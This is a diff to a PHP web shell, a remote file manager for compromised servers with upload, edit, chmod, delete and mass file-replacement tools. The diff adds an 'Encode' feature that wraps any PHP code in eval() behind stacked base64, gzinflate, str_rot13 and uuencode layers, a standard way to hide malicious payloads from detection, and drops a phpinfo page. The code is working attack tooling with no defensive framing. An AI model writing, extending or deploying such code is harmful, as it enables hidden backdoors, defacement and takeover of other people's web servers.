@@ -695,6 +695,81 @@ function makefile($filename, $text) {
 function makedir($filename) {
   return @mkdir($filename);
 }
+if (isset($_GET['encode'])) {
+    ?>
+    <thead>
+      <tr>
+        <th colspan="2">
+          <a class="back" href="?path=<?php print @cwd() ?>">ENCODE</a>
+        </th>
+      </tr>
+    </thead>
+    <form method="post">
+    <tr>
+      <td colspan="2">
+        <textarea name="text"></textarea>
+      </td>
+    </tr>
+    <tr>
+      <td>
+        <select name="mode" style="width:100%;">
+          <option value="urlencode">url</option>
+          <option value="base64">Base64</option>
+          <option value="ur">base64 - convert_uu</option>
+          <option value="gzinflates">gzinflate - base64</option>
+          <option value="str2">str_rot13 - base64</option>
+          <option value="gzinflate">str_rot13 - gzinflate - base64</option>
+          <option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
+          <option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
+        </select>
+      </td>
+      <td>
+        <input style="width:100%;" type="submit" name="submit" value="ENCODE">
+      </td>
+    </tr>
+    </form>
+    <?php
+    if (isset($_POST['submit'])) {
+      encode($_POST['text'], $_POST['mode']);
+    }
+    exit();
+}
+function encode($text, $mode) {
+  switch ($mode) {
+    case 'base64' : $codi = base64_encode($text);
+      $codi = "<?php eval('?>'.base64_decode('$codi'));";
+      break;
+    case 'str': $codi = base64_encode(str_rot13(gzdeflate(str_rot13($text))));
+      $codi = "<?php eval('?>'.str_rot13(gzinflate(str_rot13(base64_decode('$codi')))));";
+      break;
+    case 'gzinflate': $codi = base64_encode(gzdeflate(str_rot13($text)));
+      $codi = "<?php eval('?>'.str_rot13(gzinflate(base64_decode('$codi'))));";
+      break;
+    case 'gzinflates': $codi = base64_encode(gzdeflate($text));
+      $codi="<?php eval('?>'.gzinflate(base64_decode('$codi')));";
+      break;
+    case 'str2': $codi=base64_encode(str_rot13($text));
+      $codi="<?php eval('?>'.str_rot13(base64_decode('$codi')));";
+      break;
+    case 'urlencode': $codi = rawurlencode($text);
+      $codi = "<?php eval('?>'.rawurldecode('$codi'));";
+      break;
+    case 'ur' : $codi = base64_encode(convert_uuencode($text));
+      $codi="<?php eval('?>'.convert_uudecode(base64_decode('$codi')));";
+      break;
+    case 'url' : $codi=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
+      $codi="<?php eval('?>'.base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode('$codi')))))));";
+      break;
+  }
+  ?>
+  <tr>
+    <td colspan="2">
+      <textarea readonly><?= $codi ?></textarea>
+    </td>
+  </tr>
+  <?php
+  exit();
+}
 function masswriter($post) {
   if ($_GET['do'] == 'masswrite') {
       ?>
@@ -1266,9 +1341,6 @@ if ($_GET['do'] == 'delete') {
     header("Location: ?".cwd()."");
   }
 }
-if (isset($_GET['info'])) {
-    phpinfo();
-}
 @edit("edit", $_GET['file']);
 @renames("rename", $_GET['file']);
 @chmods("chmod", $_GET['file']);
@@ -1289,7 +1361,7 @@ if (isset($_GET['info'])) {
     <tr>
       <th colspan="5">
         <a class="tools" href="?path=<?php print @cwd() ?>&home">Home</a>
-        <a class="tools" href="?path=<?php print @cwd() ?>&info" target="_blank">Info</a>
+        <a class="tools" href="?path=<?php print @cwd() ?>&encode">Encode</a>
         <a class="tools" href="?path=<?php print @cwd() ?>&do=upload">Upload</a>
         <a class="tools" href="?path=<?php print @cwd() ?>&do=making">Make File</a>
         <a class="tools" href="?path=<?php print @cwd() ?>&do=masswrite">Replace File</a>
